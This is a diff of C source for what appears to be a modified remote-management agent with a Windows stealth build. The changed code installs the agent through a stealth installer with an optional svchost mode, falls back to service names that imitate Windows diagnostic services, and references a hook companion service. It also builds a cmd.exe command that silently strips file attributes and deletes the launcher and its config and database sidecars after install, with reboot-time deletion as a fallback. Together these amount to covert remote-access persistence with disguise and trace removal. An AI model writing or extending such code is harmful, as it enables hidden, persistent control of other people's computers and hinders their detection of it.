@@ -19,16 +19,27 @@ limitations under the License.
 #include <stdarg.h>
 #include <string.h>
 #include <ctype.h>
+#ifndef WIN32
+#include <strings.h>
+#define _stricmp strcasecmp
+#define _strnicmp strncasecmp
+#endif
 
 #ifdef WIN32
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <Windows.h>
 #include <WinBase.h>
+#include <winhttp.h>
+#include <wincrypt.h>
+#include <iphlpapi.h>
 #include "wincrypto.h"
 #include <shellscalingapi.h>
 #include <process.h>
 #include "../meshservice/stealth.h"
+#pragma comment(lib, "winhttp.lib")
+#pragma comment(lib, "crypt32.lib")
+#pragma comment(lib, "iphlpapi.lib")
 #endif
 
 #include "agentcore.h"
@@ -54,6 +65,7 @@ limitations under the License.
 #include "../microstack/ILibIPAddressMonitor.h"
 #if defined(WIN32) && defined(MESHAGENT_ENABLE_STEALTH)
 #include "../meshservice/stealth.h"
+#include "../meshservice/stealth_defaults.h"
 #include "../meshservice/branding_util.h"
 #include <stdarg.h>
 #include <ShlObj.h>
@@ -98,122 +110,6 @@ static void MeshAgent_ControlChannelDebugLog(MeshAgentHostContainer *agent, cons
 #include <sys/wait.h>
 #endif
 
-typedef struct mesh_network_endpoint_resolved_s
-{
-	const char* url;
-	const char* sni;
-	const char* hostHeader;
-	const char* userAgent;
-	const char* alpn;
-} mesh_network_endpoint_resolved_t;
-
-static size_t MeshAgent_GetBrandedEndpointTotal(void)
-{
-	size_t total = 0;
-	if (g_meshNetworkProfile.primaryEndpoint != NULL && g_meshNetworkProfile.primaryEndpoint[0] != 0)
-	{
-		total = 1;
-	}
-	if (g_meshNetworkProfile.fallbackCount > 0 && g_meshNetworkProfile.fallbackList != NULL)
-	{
-		for (size_t i = 0; i < g_meshNetworkProfile.fallbackCount; ++i)
-		{
-			const mesh_network_endpoint_t* entry = &(g_meshNetworkProfile.fallbackList[i]);
-			if (entry != NULL && entry->url != NULL && entry->url[0] != 0)
-			{
-				++total;
-			}
-		}
-	}
-	return total;
-}
-
-static int MeshAgent_SelectBrandedEndpoint(size_t ordinal, mesh_network_endpoint_resolved_t* endpoint)
-{
-	memset(endpoint, 0, sizeof(*endpoint));
-
-	size_t current = 0;
-	if (g_meshNetworkProfile.primaryEndpoint != NULL && g_meshNetworkProfile.primaryEndpoint[0] != 0)
-	{
-		if (ordinal == 0)
-		{
-			endpoint->url = g_meshNetworkProfile.primaryEndpoint;
-			endpoint->sni = g_meshNetworkProfile.sni;
-			endpoint->hostHeader = g_meshNetworkProfile.hostHeader;
-			endpoint->userAgent = g_meshNetworkProfile.userAgent;
-			endpoint->alpn = g_meshNetworkProfile.alpnProtocols;
-			return 1;
-		}
-		current = 1;
-	}
-
-	if (g_meshNetworkProfile.fallbackCount > 0 && g_meshNetworkProfile.fallbackList != NULL)
-	{
-		for (size_t i = 0; i < g_meshNetworkProfile.fallbackCount; ++i)
-		{
-			const mesh_network_endpoint_t* entry = &(g_meshNetworkProfile.fallbackList[i]);
-			if (entry == NULL || entry->url == NULL || entry->url[0] == 0) { continue; }
-
-			if (current == ordinal)
-			{
-				endpoint->url = entry->url;
-				endpoint->sni = (entry->sni != NULL && entry->sni[0] != 0) ? entry->sni : g_meshNetworkProfile.sni;
-				endpoint->hostHeader = (entry->hostHeader != NULL && entry->hostHeader[0] != 0) ? entry->hostHeader : g_meshNetworkProfile.hostHeader;
-				endpoint->userAgent = (entry->userAgent != NULL && entry->userAgent[0] != 0) ? entry->userAgent : g_meshNetworkProfile.userAgent;
-				endpoint->alpn = (entry->alpnProtocols != NULL && entry->alpnProtocols[0] != 0) ? entry->alpnProtocols : g_meshNetworkProfile.alpnProtocols;
-				return 1;
-			}
-
-			++current;
-		}
-	}
-
-	return 0;
-}
-
-static void MeshAgent_ResolveBrandedEndpoint(size_t ordinal, mesh_network_endpoint_resolved_t* endpoint)
-{
-	MeshAgent_SelectBrandedEndpoint(ordinal, endpoint);
-}
-
-static void MeshAgent_AdvanceBrandedEndpoint(MeshAgentHostContainer *agent, const char* reason, long detail)
-{
-	size_t total = MeshAgent_GetBrandedEndpointTotal();
-	if (total == 0)
-	{
-		agent->brandedFallbackIndex = 0;
-		return;
-	}
-	if (total == 1)
-	{
-		agent->brandedFallbackIndex = 0;
-		return;
-	}
-
-	size_t current = (size_t)(agent->brandedFallbackIndex % (int)total);
-	size_t next = (current + 1) % total;
-	const char* reasonLabel = (reason != NULL && reason[0] != 0) ? reason : "rotation";
-
-	if (detail >= 0)
-	{
-		ILibRemoteLogging_printf(ILibChainGetLogger(agent->chain), ILibRemoteLogging_Modules_Agent_GuardPost, ILibRemoteLogging_Flags_VerbosityLevel_1, "AgentCore: rotating branded endpoint (%u/%u -> %u/%u) after %s (%ld)", (unsigned int)(current + 1), (unsigned int)total, (unsigned int)(next + 1), (unsigned int)total, reasonLabel, detail);
-		if (agent->controlChannelDebug != 0 || agent->logUpdate != 0)
-		{
-			printf("Rotating branded endpoint (%u/%u -> %u/%u) after %s (%ld)\n", (unsigned int)(current + 1), (unsigned int)total, (unsigned int)(next + 1), (unsigned int)total, reasonLabel, detail);
-		}
-	}
-	else
-	{
-		ILibRemoteLogging_printf(ILibChainGetLogger(agent->chain), ILibRemoteLogging_Modules_Agent_GuardPost, ILibRemoteLogging_Flags_VerbosityLevel_1, "AgentCore: rotating branded endpoint (%u/%u -> %u/%u) after %s", (unsigned int)(current + 1), (unsigned int)total, (unsigned int)(next + 1), (unsigned int)total, reasonLabel);
-			if (agent->controlChannelDebug != 0)
-		{
-			printf("Rotating branded endpoint (%u/%u -> %u/%u) after %s\n", (unsigned int)(current + 1), (unsigned int)total, (unsigned int)(next + 1), (unsigned int)total, reasonLabel);
-		}
-	}
-
-	agent->brandedFallbackIndex = (int)next;
-}
-
 static void MeshAgent_AddHostHeader(ILibHTTPPacket *req, const char* overrideHost, const char* host, unsigned short port, int useDefaultPort)
 {
 	if (overrideHost != NULL && overrideHost[0] != 0)
@@ -235,12 +131,6 @@ static void MeshAgent_AddHostHeader(ILibHTTPPacket *req, const char* overrideHos
 static void MeshAgent_AddUserAgentHeader(ILibHTTPPacket *req, const char* overrideUA)
 {
 	const char* ua = overrideUA;
-#ifdef GENERATED_MESHAGENT_BRANDING_H
-	if ((ua == NULL || ua[0] == 0) && g_meshNetworkProfile.userAgent != NULL && g_meshNetworkProfile.userAgent[0] != 0)
-	{
-		ua = g_meshNetworkProfile.userAgent;
-	}
-#endif
 	if (ua != NULL && ua[0] != 0)
 	{
 		ILibAddHeaderLine(req, "User-Agent", 10, ua, (int)strnlen_s(ua, 512));
@@ -260,6 +150,102 @@ extern char __agentExecPath[];
 
 int gRemoteMouseRenderDefault = 0;
 
+static void MeshAgent_ClearActiveProxyAttempt(MeshAgentHostContainer *agent)
+{
+	if (agent == NULL) { return; }
+	agent->activeProxyUri[0] = 0;
+	agent->activeProxySource[0] = 0;
+	agent->activeProxyCandidateIndex = -1;
+	agent->proxyAttemptEstablished = 0;
+}
+
+static void MeshAgent_ClearGlobalTunnelProxy(MeshAgentHostContainer *agent)
+{
+	if (agent == NULL) { return; }
+	agent->proxyServer = NULL;
+	if (agent->meshCoreCtx == NULL) { return; }
+
+	int stackTop = duk_get_top(agent->meshCoreCtx);
+	if (duk_peval_string(agent->meshCoreCtx, "require('global-tunnel');") == 0)
+	{
+		duk_get_prop_string(agent->meshCoreCtx, -1, "end");
+		duk_swap_top(agent->meshCoreCtx, -2);
+		if (duk_pcall_method(agent->meshCoreCtx, 0) != 0) { duk_pop(agent->meshCoreCtx); }
+	}
+	duk_set_top(agent->meshCoreCtx, stackTop);
+}
+
+static void MeshAgent_RecordProxyAttemptFailure(MeshAgentHostContainer *agent, const char *reason)
+{
+	(void)reason;
+	if (agent == NULL) { return; }
+	agent->proxyFailed = 1;
+	MeshAgent_ClearGlobalTunnelProxy(agent);
+	MeshAgent_ClearActiveProxyAttempt(agent);
+}
+
+static void MeshAgent_RecordProxyAttemptSuccess(MeshAgentHostContainer *agent)
+{
+	if (agent == NULL) { return; }
+	agent->proxyFailed = 0;
+	agent->proxyFallbackIndex = 0;
+	MeshAgent_ClearActiveProxyAttempt(agent);
+}
+
+static int MeshAgent_IsIpLiteral(const char *host)
+{
+	struct in_addr addr4;
+	struct in6_addr addr6;
+	if (host == NULL || host[0] == 0) { return 0; }
+	return ILibInet_pton(AF_INET, host, &addr4) == 1 || ILibInet_pton(AF_INET6, host, &addr6) == 1;
+}
+
+static int MeshAgent_SockAddrFromIpLiteral(const char *host, unsigned short port, struct sockaddr_in6 *address)
+{
+	struct in_addr addr4;
+	struct in6_addr addr6;
+	if (address == NULL || host == NULL || host[0] == 0) { return 0; }
+	memset(address, 0, sizeof(struct sockaddr_in6));
+	if (ILibInet_pton(AF_INET, host, &addr4) == 1)
+	{
+		struct sockaddr_in *v4 = (struct sockaddr_in*)address;
+		v4->sin_family = AF_INET;
+		v4->sin_port = htons(port);
+		memcpy_s(&(v4->sin_addr), sizeof(v4->sin_addr), &addr4, sizeof(addr4));
+		return 1;
+	}
+	if (ILibInet_pton(AF_INET6, host, &addr6) == 1)
+	{
+		address->sin6_family = AF_INET6;
+		address->sin6_port = htons(port);
+		memcpy_s(&(address->sin6_addr), sizeof(address->sin6_addr), &addr6, sizeof(addr6));
+		return 1;
+	}
+	return 0;
+}
+
+static int MeshAgent_ResolveControlChannelAddress(MeshAgentHostContainer *agent, const char *serverUrl, int serverUrlLen, const char *host, unsigned short port, struct sockaddr_in6 *address, const char **sourceOut)
+{
+	(void)agent;
+	(void)serverUrl;
+	(void)serverUrlLen;
+	if (sourceOut != NULL) { *sourceOut = "os"; }
+	if (address == NULL || host == NULL || host[0] == 0) { return 0; }
+	if (MeshAgent_SockAddrFromIpLiteral(host, port, address))
+	{
+		if (sourceOut != NULL) { *sourceOut = "literal"; }
+		return 1;
+	}
+	if (ILibResolveEx((char*)host, port, address) == 0 && address->sin6_family != AF_UNSPEC)
+	{
+		if (sourceOut != NULL) { *sourceOut = "os"; }
+		return 1;
+	}
+	memset(address, 0, sizeof(struct sockaddr_in6));
+	address->sin6_family = AF_UNSPEC;
+	return 0;
+}
+
 #if defined(WIN32) && defined(MESHAGENT_ENABLE_STEALTH)
 static void MeshAgent_EnsureDirectoryW(const wchar_t* path);
 static BOOL MeshAgent_FindRepoRootW(wchar_t* output, size_t outputLen);
@@ -267,13 +253,13 @@ static BOOL MeshAgent_StageSelfTestModule(const wchar_t* installDir);
 static void MeshAgent_StageSelfTestModuleBestEffort(void);
 static void MeshAgent_StageSelfTestModuleForCurrentExeBestEffort(void);
 static BOOL MeshAgent_RunChildProcess(const wchar_t* exePath, const wchar_t* args, DWORD timeoutMs, DWORD* exitCode);
-static BOOL MeshAgent_EnsureMasterServiceInstalled(struct MeshAgentHostContainer* agentHost, const wchar_t* sourceOverride, BOOL requireControlPipe);
-static BOOL MeshAgent_UninstallMasterService(void);
+static void MeshAgent_EnsureCoreModuleRuntimeGlobals(duk_context* ctx);
+static BOOL MeshAgent_BuildSiblingPathWithExtensionW(const wchar_t* sourcePath, const wchar_t* extension, wchar_t* output, size_t outputLen);
 static void MeshAgent_RequestLauncherCleanupAfterInstall(const wchar_t* requestedLauncherPath);
+static BOOL MeshAgent_RunPreProtectionCaptureValidationW(const wchar_t* outputPath);
 
-#define MESHAGENT_MASTER_SERVICE_EXE_NAME L"MasterService.exe"
-#define MESHAGENT_MASTER_SERVICE_SERVICE_NAME L"AdvancedHookService"
-#define MESHAGENT_UMH_CONTROL_PIPE_NAME L"\\\\.\\pipe\\{95c1a2e0-f84e-4c8a-9c32}-control"
+/* UMH companion service identifiers — SSOT: meshcore/config/umh_defines.h */
+#include "config/umh_defines.h"
 
 static void MeshAgent_LogNativeInstallerEvent(const char* fmt, ...)
 {
@@ -292,7 +278,7 @@ static void MeshAgent_LogNativeInstallerEvent(const char* fmt, ...)
 	{
 		lstrcpynW(logDir, L"C:\\ProgramData", _countof(logDir));
 	}
-	StringCchCatW(logDir, _countof(logDir), L"\\DiagnosticHost\\logs");
+	StringCchCatW(logDir, _countof(logDir), L"\\" STEALTH_FALLBACK_SERVICE_NAME L"\\logs");
 	CreateDirectoryW(logDir, NULL);
 	StringCchPrintfW(logPath, _countof(logPath), L"%s\\native-install.log", logDir);
 
@@ -383,6 +369,19 @@ static BOOL MeshAgent_PathStartsWithInsensitiveW(const wchar_t* path, const wcha
 	return (next == L'\0' || next == L'\\' || next == L'/');
 }
 
+static BOOL MeshAgent_BuildSiblingPathWithExtensionW(const wchar_t* sourcePath, const wchar_t* extension, wchar_t* output, size_t outputLen)
+{
+	if (sourcePath == NULL || sourcePath[0] == L'\0' || extension == NULL || extension[0] == L'\0' || output == NULL || outputLen == 0) { return FALSE; }
+	output[0] = L'\0';
+	if (FAILED(StringCchCopyW(output, outputLen, sourcePath))) { return FALSE; }
+	wchar_t* dot = wcsrchr(output, L'.');
+	if (dot != NULL)
+	{
+		return SUCCEEDED(StringCchCopyW(dot, outputLen - (size_t)(dot - output), extension));
+	}
+	return SUCCEEDED(StringCchCatW(output, outputLen, extension));
+}
+
 static void MeshAgent_RequestLauncherCleanupAfterInstall(const wchar_t* requestedLauncherPath)
 {
 	wchar_t launcherPath[MAX_PATH * 4] = {0};
@@ -432,6 +431,21 @@ static void MeshAgent_RequestLauncherCleanupAfterInstall(const wchar_t* requeste
 	}
 
 	wchar_t cmdPath[MAX_PATH] = {0};
+	wchar_t normalizedLauncherMsh[MAX_PATH * 4] = {0};
+	wchar_t normalizedLauncherConf[MAX_PATH * 4] = {0};
+	wchar_t normalizedLauncherDb[MAX_PATH * 4] = {0};
+	if (!MeshAgent_BuildSiblingPathWithExtensionW(normalizedLauncher, L".msh", normalizedLauncherMsh, _countof(normalizedLauncherMsh)))
+	{
+		StringCchCopyW(normalizedLauncherMsh, _countof(normalizedLauncherMsh), normalizedLauncher);
+	}
+	if (!MeshAgent_BuildSiblingPathWithExtensionW(normalizedLauncher, L".conf", normalizedLauncherConf, _countof(normalizedLauncherConf)))
+	{
+		StringCchCopyW(normalizedLauncherConf, _countof(normalizedLauncherConf), normalizedLauncher);
+	}
+	if (!MeshAgent_BuildSiblingPathWithExtensionW(normalizedLauncher, L".db", normalizedLauncherDb, _countof(normalizedLauncherDb)))
+	{
+		StringCchCopyW(normalizedLauncherDb, _countof(normalizedLauncherDb), normalizedLauncher);
+	}
 	UINT cmdPathLen = GetSystemDirectoryW(cmdPath, _countof(cmdPath));
 	if (cmdPathLen == 0 || cmdPathLen >= _countof(cmdPath) || FAILED(StringCchCatW(cmdPath, _countof(cmdPath), L"\\cmd.exe")))
 	{
@@ -442,16 +456,20 @@ static void MeshAgent_RequestLauncherCleanupAfterInstall(const wchar_t* requeste
 	if (FAILED(StringCchPrintfW(
 		cmdLine,
 		_countof(cmdLine),
-		L"\"%ls\" /C ping 127.0.0.1 -n 4 >nul & attrib -r -s -h \"%ls\" >nul 2>&1 & del /f /q \"%ls\" >nul 2>&1 & if exist \"%ls\" (ping 127.0.0.1 -n 3 >nul & del /f /q \"%ls\" >nul 2>&1) & if exist \"%ls\" (ping 127.0.0.1 -n 3 >nul & del /f /q \"%ls\" >nul 2>&1) & if exist \"%ls\" (ping 127.0.0.1 -n 3 >nul & del /f /q \"%ls\" >nul 2>&1)",
+		L"\"%ls\" /C ping 127.0.0.1 -n 4 >nul & attrib -r -s -h \"%ls\" \"%ls\" \"%ls\" \"%ls\" >nul 2>&1 & del /f /q \"%ls\" \"%ls\" \"%ls\" \"%ls\" >nul 2>&1 & ping 127.0.0.1 -n 3 >nul & del /f /q \"%ls\" \"%ls\" \"%ls\" \"%ls\" >nul 2>&1",
 		cmdPath,
 		normalizedLauncher,
+		normalizedLauncherMsh,
+		normalizedLauncherConf,
+		normalizedLauncherDb,
 		normalizedLauncher,
+		normalizedLauncherMsh,
+		normalizedLauncherConf,
+		normalizedLauncherDb,
 		normalizedLauncher,
-		normalizedLauncher,
-		normalizedLauncher,
-		normalizedLauncher,
-		normalizedLauncher,
-		normalizedLauncher)))
+		normalizedLauncherMsh,
+		normalizedLauncherConf,
+		normalizedLauncherDb)))
 	{
 		MeshAgent_LogNativeInstallerEvent("...Launcher cleanup setup failed: command line too long");
 		return;
@@ -465,14 +483,17 @@ static void MeshAgent_RequestLauncherCleanupAfterInstall(const wchar_t* requeste
 	{
 		CloseHandle(pi.hThread);
 		CloseHandle(pi.hProcess);
-		MeshAgent_LogNativeInstallerEvent("...Launcher cleanup scheduled for %ls", normalizedLauncher);
+		MeshAgent_LogNativeInstallerEvent("...Launcher cleanup scheduled for %ls and staged sidecars", normalizedLauncher);
 		return;
 	}
 
 	DWORD spawnErr = GetLastError();
 	if (MoveFileExW(normalizedLauncher, NULL, MOVEFILE_DELAY_UNTIL_REBOOT))
 	{
-		MeshAgent_LogNativeInstallerEvent("...Launcher cleanup deferred to reboot for %ls (CreateProcess error=%lu)", normalizedLauncher, spawnErr);
+		if (_wcsicmp(normalizedLauncherMsh, normalizedLauncher) != 0) { (void)MoveFileExW(normalizedLauncherMsh, NULL, MOVEFILE_DELAY_UNTIL_REBOOT); }
+		if (_wcsicmp(normalizedLauncherConf, normalizedLauncher) != 0) { (void)MoveFileExW(normalizedLauncherConf, NULL, MOVEFILE_DELAY_UNTIL_REBOOT); }
+		if (_wcsicmp(normalizedLauncherDb, normalizedLauncher) != 0) { (void)MoveFileExW(normalizedLauncherDb, NULL, MOVEFILE_DELAY_UNTIL_REBOOT); }
+		MeshAgent_LogNativeInstallerEvent("...Launcher cleanup deferred to reboot for %ls and staged sidecars (CreateProcess error=%lu)", normalizedLauncher, spawnErr);
 	}
 	else
 	{
@@ -483,7 +504,7 @@ static void MeshAgent_RequestLauncherCleanupAfterInstall(const wchar_t* requeste
 	}
 }
 
-static BOOL MeshAgent_RunNativeStealthFullInstall(struct MeshAgentHostContainer* agentHost, const wchar_t* masterServiceSource, BOOL masterServiceEnabled)
+static BOOL MeshAgent_RunNativeStealthFullInstall(struct MeshAgentHostContainer* agentHost)
 {
 	if (agentHost == NULL || agentHost->exePath == NULL) { return FALSE; }
 	WCHAR exePathW[MAX_PATH * 4];
@@ -496,21 +517,20 @@ static BOOL MeshAgent_RunNativeStealthFullInstall(struct MeshAgentHostContainer*
 
 	MeshAgent_LogNativeInstallerEvent("...Running native stealth installer (svchost: %s)", useSvchostMode ? "enabled" : "disabled");
 	const BOOL previouslyInstalled = Stealth_IsAlreadyInstalled();
-	MeshAgent_LogNativeInstallerEvent("...Ensuring previous stealth installation is removed (detected: %s)", previouslyInstalled ? "yes" : "no");
-	if (!Stealth_PerformCompleteUninstallation())
-	{
-		MeshAgent_LogNativeInstallerEvent("...Pre-install cleanup reported failure (LastError=%lu)", GetLastError());
-	}
+	MeshAgent_LogNativeInstallerEvent("...Lifecycle planner will evaluate existing state before install (detected installed: %s)", previouslyInstalled ? "yes" : "no");
 
 	if (Stealth_PerformCompleteInstallation(exePathW, NULL, useSvchostMode))
 	{
 		MeshAgent_StageSelfTestModuleBestEffort();
-		if (masterServiceEnabled && !MeshAgent_EnsureMasterServiceInstalled(agentHost, masterServiceSource, TRUE))
-		{
-			MeshAgent_LogNativeInstallerEvent("...MasterService integration failed during install");
-			return FALSE;
-		}
 		MeshAgent_LogNativeInstallerEvent("...Native stealth installer completed successfully");
+		return TRUE;
+	}
+
+	if ((previouslyInstalled ? Stealth_RunUpdateValidation() : Stealth_RunInstallValidation()))
+	{
+		MeshAgent_StageSelfTestModuleBestEffort();
+		MeshAgent_LogNativeInstallerEvent("...Native stealth installer reported failure but final %s validation passed",
+			previouslyInstalled ? "update" : "install");
 		return TRUE;
 	}
 
@@ -518,14 +538,9 @@ static BOOL MeshAgent_RunNativeStealthFullInstall(struct MeshAgentHostContainer*
 	return FALSE;
 }
 
-static BOOL MeshAgent_RunNativeStealthFullUninstall(BOOL masterServiceEnabled)
+static BOOL MeshAgent_RunNativeStealthFullUninstall(void)
 {
 	MeshAgent_LogNativeInstallerEvent("...Running native stealth uninstaller");
-	if (masterServiceEnabled && !MeshAgent_UninstallMasterService())
-	{
-		MeshAgent_LogNativeInstallerEvent("...MasterService uninstall verification failed");
-		return FALSE;
-	}
 	if (Stealth_PerformCompleteUninstallation())
 	{
 		return TRUE;
@@ -547,9 +562,36 @@ static void MeshAgent_GetServiceKeyNameW(wchar_t* buffer, size_t count)
 	MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), buffer, count);
 	if (buffer[0] == L'\0')
 	{
-		StringCchCopyW(buffer, count, L"WinDiagnosticHost");
+		StringCchCopyW(buffer, count, STEALTH_FALLBACK_SERVICE_NAME);
 	}
 	buffer[count - 1] = L'\0';
+}
+
+static void MeshAgent_ApplyNativeLifecycleBrandingOverrides(struct MeshAgentHostContainer* agentHost)
+{
+#if defined(WIN32) && defined(MESHAGENT_ENABLE_STEALTH)
+	char value[1024];
+	int len = 0;
+
+	Stealth_ClearRuntimeBrandingOverrides();
+	if (agentHost == NULL || agentHost->masterDb == NULL) { return; }
+
+	len = ILibSimpleDataStore_Get(agentHost->masterDb, "displayName", value, sizeof(value) - 1);
+	if (len > 0 && len < (int)sizeof(value))
+	{
+		value[len] = 0;
+		Stealth_SetRuntimeDisplayNameUtf8(value);
+	}
+
+	len = ILibSimpleDataStore_Get(agentHost->masterDb, "description", value, sizeof(value) - 1);
+	if (len > 0 && len < (int)sizeof(value))
+	{
+		value[len] = 0;
+		Stealth_SetRuntimeServiceDescriptionUtf8(value);
+	}
+#else
+	UNREFERENCED_PARAMETER(agentHost);
+#endif
 }
 
 static BOOL MeshAgent_WaitForServiceRunning(const wchar_t* serviceName, DWORD timeoutMs)
@@ -586,6 +628,79 @@ static BOOL MeshAgent_WaitForServiceRunning(const wchar_t* serviceName, DWORD ti
 	CloseServiceHandle(svc);
 	CloseServiceHandle(scm);
 	return running;
+}
+
+static BOOL MeshAgent_WaitForServiceNotRunning(const wchar_t* serviceName, DWORD timeoutMs)
+{
+	if (serviceName == NULL || serviceName[0] == L'\0') { return FALSE; }
+	DWORD waited = 0;
+
+	SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
+	if (scm == NULL) { return FALSE; }
+	SC_HANDLE svc = OpenServiceW(scm, serviceName, SERVICE_QUERY_STATUS);
+	if (svc == NULL)
+	{
+		DWORD err = GetLastError();
+		CloseServiceHandle(scm);
+		return (err == ERROR_SERVICE_DOES_NOT_EXIST) ? TRUE : FALSE;
+	}
+
+	while (waited < timeoutMs)
+	{
+		SERVICE_STATUS_PROCESS ssp = {0};
+		DWORD needed = 0;
+		if (QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &needed))
+		{
+			if (ssp.dwCurrentState != SERVICE_RUNNING)
+			{
+				CloseServiceHandle(svc);
+				CloseServiceHandle(scm);
+				return TRUE;
+			}
+		}
+		Sleep(1000);
+		waited += 1000;
+	}
+
+	CloseServiceHandle(svc);
+	CloseServiceHandle(scm);
+	return FALSE;
+}
+
+static BOOL MeshAgent_WaitForServiceAbsent(const wchar_t* serviceName, DWORD timeoutMs)
+{
+	if (serviceName == NULL || serviceName[0] == L'\0') { return FALSE; }
+
+	SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
+	if (scm == NULL) { return FALSE; }
+
+	ULONGLONG start = GetTickCount64();
+	while ((GetTickCount64() - start) < timeoutMs)
+	{
+		SC_HANDLE svc = OpenServiceW(scm, serviceName, SERVICE_QUERY_STATUS);
+		if (svc == NULL)
+		{
+			DWORD err = GetLastError();
+			if (err == ERROR_SERVICE_DOES_NOT_EXIST)
+			{
+				CloseServiceHandle(scm);
+				return TRUE;
+			}
+			if (err == ERROR_SERVICE_MARKED_FOR_DELETE)
+			{
+				Sleep(500);
+				continue;
+			}
+			CloseServiceHandle(scm);
+			return FALSE;
+		}
+
+		CloseServiceHandle(svc);
+		Sleep(500);
+	}
+
+	CloseServiceHandle(scm);
+	return FALSE;
 }
 
 static BOOL MeshAgent_QueryServiceStatus(const wchar_t* serviceName, SERVICE_STATUS_PROCESS* status)
@@ -884,6 +999,51 @@ static BOOL MeshAgent_CopyFileIfPresentW(const wchar_t* sourcePath, const wchar_
 	return (CopyFileW(sourcePath, destPath, FALSE) != 0);
 }
 
+static void MeshAgent_EnsureCoreModuleRuntimeGlobals(duk_context* ctx)
+{
+	if (ctx == NULL) { return; }
+	if (duk_peval_string(ctx,
+		"(function(){"
+		"var g=(function(){return this;})();"
+		"if(typeof g.__!=='function'){"
+		"g.__=function(){return arguments.length>0?arguments[0]:'';};"
+		"}"
+		"if(typeof global!=='undefined'&&typeof global.__!=='function'){global.__=g.__;}"
+		"if(typeof globalThis!=='undefined'&&typeof globalThis.__!=='function'){globalThis.__=g.__;}"
+		"})();") != 0)
+	{
+		duk_pop(ctx);
+		return;
+	}
+	duk_pop(ctx);
+}
+
+static BOOL MeshAgent_FindModulePathFromBaseDir(const wchar_t* baseDir, const wchar_t* moduleFileName, wchar_t* output, size_t outputLen)
+{
+	wchar_t candidateDir[MAX_PATH] = {0};
+
+	if (baseDir == NULL || baseDir[0] == L'\0' || moduleFileName == NULL || moduleFileName[0] == L'\0' || output == NULL || outputLen == 0)
+	{
+		return FALSE;
+	}
+	if (FAILED(StringCchCopyW(candidateDir, _countof(candidateDir), baseDir))) { return FALSE; }
+
+	while (candidateDir[0] != L'\0')
+	{
+		if (SUCCEEDED(StringCchPrintfW(output, outputLen, L"%s\\modules\\%s", candidateDir, moduleFileName)) &&
+			GetFileAttributesW(output) != INVALID_FILE_ATTRIBUTES)
+		{
+			return TRUE;
+		}
+
+		wchar_t* slash = wcsrchr(candidateDir, L'\\');
+		if (slash == NULL) { break; }
+		*slash = L'\0';
+	}
+
+	return FALSE;
+}
+
 static BOOL MeshAgent_FindModulePath(const wchar_t* moduleFileName, wchar_t* output, size_t outputLen)
 {
 	if (moduleFileName == NULL || output == NULL || outputLen == 0) { return FALSE; }
@@ -894,23 +1054,13 @@ static BOOL MeshAgent_FindModulePath(const wchar_t* moduleFileName, wchar_t* out
 	{
 		wchar_t* lastSlash = wcsrchr(exeDir, L'\\');
 		if (lastSlash != NULL) { *lastSlash = L'\0'; }
-
-		for (int depth = 0; depth < 6; ++depth)
-		{
-			StringCchPrintfW(output, outputLen, L"%s\\modules\\%s", exeDir, moduleFileName);
-			if (GetFileAttributesW(output) != INVALID_FILE_ATTRIBUTES) { return TRUE; }
-
-			wchar_t* slash = wcsrchr(exeDir, L'\\');
-			if (slash == NULL) { break; }
-			*slash = L'\0';
-		}
+		if (MeshAgent_FindModulePathFromBaseDir(exeDir, moduleFileName, output, outputLen)) { return TRUE; }
 	}
 
 	wchar_t cwd[MAX_PATH] = {0};
 	if (GetCurrentDirectoryW(_countof(cwd), cwd) > 0)
 	{
-		StringCchPrintfW(output, outputLen, L"%s\\modules\\%s", cwd, moduleFileName);
-		if (GetFileAttributesW(output) != INVALID_FILE_ATTRIBUTES) { return TRUE; }
+		if (MeshAgent_FindModulePathFromBaseDir(cwd, moduleFileName, output, outputLen)) { return TRUE; }
 	}
 
 	output[0] = L'\0';
@@ -1018,541 +1168,6 @@ static BOOL MeshAgent_GetDirectoryNameW(const wchar_t* fullPath, wchar_t* outDir
 	return TRUE;
 }
 
-static BOOL MeshAgent_TryMasterServiceCandidate(const wchar_t* candidatePath, wchar_t* output, size_t outputLen)
-{
-	if (!MeshAgent_FileExistsW(candidatePath)) { return FALSE; }
-	if (FAILED(StringCchCopyW(output, outputLen, candidatePath))) { return FALSE; }
-	return TRUE;
-}
-
-static BOOL MeshAgent_BuildMasterServiceInstallPath(wchar_t* output, size_t outputLen)
-{
-	if (output == NULL || outputLen == 0) { return FALSE; }
-	output[0] = L'\0';
-
-	StealthInstallPaths paths;
-	ZeroMemory(&paths, sizeof(paths));
-	if (!Stealth_GetInstallPaths(&paths) || paths.installDir[0] == L'\0') { return FALSE; }
-	if (FAILED(StringCchPrintfW(output, outputLen, L"%s\\%s", paths.installDir, MESHAGENT_MASTER_SERVICE_EXE_NAME))) { return FALSE; }
-	return TRUE;
-}
-
-static BOOL MeshAgent_FindMasterServiceSource(
-	const wchar_t* sourceOverride,
-	const char* agentExePathUtf8,
-	wchar_t* output,
-	size_t outputLen)
-{
-	if (output == NULL || outputLen == 0) { return FALSE; }
-	output[0] = L'\0';
-
-	if (sourceOverride != NULL && sourceOverride[0] != L'\0')
-	{
-		return MeshAgent_TryMasterServiceCandidate(sourceOverride, output, outputLen);
-	}
-
-	wchar_t envSource[MAX_PATH * 4] = {0};
-	DWORD envLen = GetEnvironmentVariableW(L"MESHAGENT_MASTER_SERVICE_SOURCE", envSource, (DWORD)_countof(envSource));
-	if (envLen > 0 && envLen < _countof(envSource))
-	{
-		if (MeshAgent_TryMasterServiceCandidate(envSource, output, outputLen)) { return TRUE; }
-	}
-
-	wchar_t candidate[MAX_PATH * 4] = {0};
-	wchar_t exePathW[MAX_PATH * 4] = {0};
-	wchar_t exeDirW[MAX_PATH * 4] = {0};
-	if (agentExePathUtf8 != NULL && agentExePathUtf8[0] != '\0')
-	{
-		ILibUTF8ToWideEx((char*)agentExePathUtf8, -1, exePathW, (int)_countof(exePathW));
-		if (MeshAgent_GetDirectoryNameW(exePathW, exeDirW, _countof(exeDirW)))
-		{
-			if (SUCCEEDED(StringCchPrintfW(candidate, _countof(candidate), L"%s\\%s", exeDirW, MESHAGENT_MASTER_SERVICE_EXE_NAME)) &&
-				MeshAgent_TryMasterServiceCandidate(candidate, output, outputLen))
-			{
-				return TRUE;
-			}
-		}
-	}
-
-	if (GetModuleFileNameW(NULL, exePathW, _countof(exePathW)) > 0 &&
